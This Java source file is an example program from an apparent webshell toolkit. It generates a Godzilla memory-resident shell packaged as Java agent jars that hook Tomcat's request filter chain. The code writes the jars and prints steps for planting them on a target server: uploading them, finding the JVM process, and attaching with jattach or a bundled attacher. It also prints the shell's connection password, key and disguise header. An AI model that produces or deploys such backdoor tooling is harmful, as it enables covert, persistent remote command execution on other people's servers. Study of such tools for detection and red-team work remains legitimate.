package com.reajason.javaweb.examples.memshell;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.PackerRegistry;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
import com.reajason.javaweb.packer.Packers;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;

/**
 * Agent 内存马：不经过应用的 Servlet/Filter 注册流程，而是把 ClassFileTransformer 装进
 * 目标 JVM，改写 {@code org.apache.catalina.core.ApplicationFilterChain#doFilter}，
 * 请求进来时由它执行 shell。Tomcat 的 Agent 类型有
 * {@link ShellType#AGENT_FILTER_CHAIN} 与 {@link ShellType#CATALINA_AGENT_CONTEXT_VALVE}，
 * 这里生成前者。
 *
 * <p>产物是一个 Java Agent Jar，两种投递方式：
 * <ul>
 *   <li>{@link Packers#AgentJar}：纯 Agent Jar，没有 Main-Class，用 jattach 加载；</li>
 *   <li>{@link Packers#AgentJarWithJREAttacher}：自带 Attacher（JNA 实现），
 *       {@code java -jar agent.jar <pid>} 直接附着，不依赖目标 JDK 的 tools.jar / jdk.attach。</li>
 * </ul>
 *
 * <p>可选第一个参数指定 jar 输出目录，默认 {@code java.io.tmpdir}。
 *
 * @author ReaJason
 * @since 2026/10/22
 */
public class AgentMemShell {
    public static void main(String[] args) throws IOException {
        Path outputDir = Paths.get(args.length > 0 ? args[0] : System.getProperty("java.io.tmpdir"));
        Files.createDirectories(outputDir);

        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("Mozilla/5.0")
                .build();

        MemShellResult result = new MemShellGenerator().generate(
                ShellConfig.builder()
                        .server(Server.Tomcat)
                        .shellTool(ShellTool.Godzilla)
                        .shellType(ShellType.AGENT_FILTER_CHAIN)
                        .build(),
                InjectorConfig.builder().build(),
                godzillaConfig);

        Path pureAgent = writeJar(result, Packers.AgentJar, outputDir.resolve("memshell-agent.jar"));
        Path attacherAgent = writeJar(result, Packers.AgentJarWithJREAttacher,
                outputDir.resolve("memshell-agent-attacher.jar"));

        System.out.println("shell 类：" + result.getShellClassName() + "（" + result.getShellSize() + " B）");
        System.out.println("Agent 类：" + result.getInjectorClassName() + "（" + result.getInjectorSize() + " B）");
        System.out.println();
        System.out.println("纯 Agent Jar（jattach 投递）：" + pureAgent);
        System.out.println("  1. 上传 " + pureAgent.getFileName() + " 与 jattach 到目标服务器");
        System.out.println("  2. 获取目标 JVM pid（jps / ps）");
        System.out.println("  3. jattach <pid> load instrument false " + pureAgent);
        System.out.println();
        System.out.println("自带 Attacher 的 Agent Jar（java -jar 投递）：" + attacherAgent);
        System.out.println("  java -jar " + attacherAgent + " <pid>");
        System.out.println("  java -jar " + attacherAgent + " all");
        System.out.println();
        System.out.println("哥斯拉连接参数：pass=" + godzillaConfig.getPass()
                + ", key=" + godzillaConfig.getKey()
                + ", " + godzillaConfig.getHeaderName() + "=" + godzillaConfig.getHeaderValue());
    }

    private static Path writeJar(MemShellResult result, String packer, Path target) throws IOException {
        // PackerRegistry 对 JarPacker 统一返回 Base64，这里落盘成可直接上传的 jar
        String base64 = PackerRegistry.getInstance().pack(packer, result);
        Files.write(target, Base64.getDecoder().decode(base64));
        return target.toAbsolutePath();
    }
}
